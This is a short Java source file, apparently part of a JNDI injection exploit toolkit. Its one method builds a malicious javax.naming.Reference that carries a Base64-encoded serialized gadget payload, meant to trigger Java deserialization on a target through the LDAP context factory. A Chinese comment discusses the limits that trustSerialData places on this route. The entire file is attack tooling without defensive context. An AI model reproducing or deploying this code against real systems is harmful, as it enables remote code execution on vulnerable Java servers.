package sonomon.jndi.factory;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import com.unboundid.util.Base64;
import sonomon.jndi.deser.Deserialize;

public class LdapCtxFactory {
	//ldap中走FactoryObject也能反序列化,使用任意jdk内置的FactoryObject,同样受trustSerialData=false影响,因此意义不大
	//详情见Obj.decodeReference(Attributes, String[]) line: 480	
	static String factory = "com.sun.jndi.ldap.LdapCtxFactory";

	public static Reference deserbypass(String gadget, String payload) throws Exception{
		byte[] bs = Deserialize.getJavaSerializeData(gadget, payload);
    	Reference ref = new Reference("java.lang.Class", factory, null);
	    ref.add(new StringRefAddr("readObject", Base64.encode(bs)));
		return ref;
	}
	
}
